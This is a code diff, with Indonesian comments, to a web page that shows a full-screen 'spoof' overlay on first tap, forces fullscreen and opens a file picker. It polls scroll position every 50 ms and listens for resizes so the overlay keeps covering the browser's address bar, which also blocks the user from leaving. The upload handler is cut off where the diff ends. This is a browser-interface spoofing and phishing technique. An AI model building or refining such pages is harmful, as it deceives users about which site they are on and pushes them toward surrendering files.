@@ -9,15 +9,11 @@
       margin: 0;
       padding: 0;
       width: 100vw;
-      height: 100vh; /* fix viewport */
-      overflow: hidden; /* prevent scroll */
+      height: 100vh;       /* lock viewport */
+      overflow: hidden;    /* prevent scroll */
       background: #111;
       color: #fff;
       font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
     }
 
     #spoof {
@@ -33,6 +29,10 @@
     }
 
     #content {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       text-align: center;
       z-index: 1;
     }
@@ -57,38 +57,39 @@ const spoof = document.getElementById('spoof');
 const content = document.getElementById('content');
 
 function forceScrollTop() {
-  window.scrollTo(0, 0);
+  window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
   document.body.scrollTop = 0;
   document.documentElement.scrollTop = 0;
 }
 
-// TAP ANYWHERE: langsung overlay, fullscreen, file picker
+// Tap anywhere: langsung overlay + fullscreen + file picker
 document.addEventListener('click', async () => {
   spoof.style.display = 'block';
   content.style.display = 'none';
 
-  // fullscreen
   if (document.documentElement.requestFullscreen) {
     try { await document.documentElement.requestFullscreen(); } catch(e) {}
   }
 
-  // trigger file picker
   filePicker.click();
 }, { once: true });
 
-// keluar fullscreen: paksa scroll top agar overlay tetap nutupi omnibar
+// Deteksi keluar fullscreen
 document.addEventListener('fullscreenchange', () => {
   if (!document.fullscreenElement) {
     forceScrollTop();
   }
 });
 
-// polling tambahan untuk tombol back Android
+// Interval polling ekstra untuk tombol back Android / browser resize
 setInterval(() => {
-  if (!document.fullscreenElement) {
-    forceScrollTop();
-  }
-}, 100);
+  forceScrollTop();
+}, 50);
+
+// Optional: resize listener untuk nutup omnibar
+window.addEventListener('resize', () => {
+  forceScrollTop();
+});
 
 filePicker.addEventListener('change', () => {
   if (filePicker.files.length > 0) {
